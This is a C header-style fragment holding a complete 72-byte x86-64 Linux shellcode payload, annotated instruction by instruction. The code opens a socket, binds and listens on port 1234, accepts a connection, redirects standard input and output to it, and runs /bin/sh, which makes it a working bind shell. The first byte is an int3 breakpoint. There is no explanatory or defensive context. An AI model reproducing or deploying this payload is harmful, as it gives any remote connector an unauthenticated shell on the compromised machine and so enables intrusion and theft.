
#define BS_SIZE 72

char BS[] = {
  /* 0000 */ "\xcc"                                     /* int3                        */
  /* 0001 */ "\x6a\x29"                                 /* push 0x29                   */
  /* 0003 */ "\x58"                                     /* pop rax                     */
  /* 0004 */ "\x6a\x01"                                 /* push 0x1                    */
  /* 0006 */ "\x5e"                                     /* pop rsi                     */
  /* 0007 */ "\x6a\x02"                                 /* push 0x2                    */
  /* 0009 */ "\x5f"                                     /* pop rdi                     */
  /* 000A */ "\x99"                                     /* cdq                         */
  /* 000B */ "\x0f\x05"                                 /* syscall                     */
  /* 000D */ "\x97"                                     /* xchg edi, eax               */
  /* 000E */ "\xbb\x02\xff\x04\xd2"                     /* mov ebx, 0xd204ff02         */
  /* 0013 */ "\xfe\xc7"                                 /* inc bh                      */
  /* 0015 */ "\x53"                                     /* push rbx                    */
  /* 0016 */ "\x54"                                     /* push rsp                    */
  /* 0017 */ "\x5e"                                     /* pop rsi                     */
  /* 0018 */ "\xb2\x10"                                 /* mov dl, 0x10                */
  /* 001A */ "\xb0\x31"                                 /* mov al, 0x31                */
  /* 001C */ "\x0f\x05"                                 /* syscall                     */
  /* 001E */ "\x31\xf6"                                 /* xor esi, esi                */
  /* 0020 */ "\xb0\x32"                                 /* mov al, 0x32                */
  /* 0022 */ "\x0f\x05"                                 /* syscall                     */
  /* 0024 */ "\xb0\x2b"                                 /* mov al, 0x2b                */
  /* 0026 */ "\x0f\x05"                                 /* syscall                     */
  /* 0028 */ "\x97"                                     /* xchg edi, eax               */
  /* 0029 */ "\x96"                                     /* xchg esi, eax               */
  /* 002A */ "\xb0\x21"                                 /* mov al, 0x21                */
  /* 002C */ "\x0f\x05"                                 /* syscall                     */
  /* 002E */ "\x83\xee\x01"                             /* sub esi, 0x1                */
  /* 0031 */ "\x79\xf7"                                 /* jns 0x2a                    */
  /* 0033 */ "\x31\xf6"                                 /* xor esi, esi                */
  /* 0035 */ "\x52"                                     /* push rdx                    */
  /* 0036 */ "\x48\xb9\x2f\x62\x69\x6e\x2f\x2f\x73\x68" /* mov rcx, 0x68732f2f6e69622f */
  /* 0040 */ "\x51"                                     /* push rcx                    */
  /* 0041 */ "\x54"                                     /* push rsp                    */
  /* 0042 */ "\x5f"                                     /* pop rdi                     */
  /* 0043 */ "\x99"                                     /* cdq                         */
  /* 0044 */ "\xb0\x3b"                                 /* mov al, 0x3b                */
  /* 0046 */ "\x0f\x05"                                 /* syscall                     */
};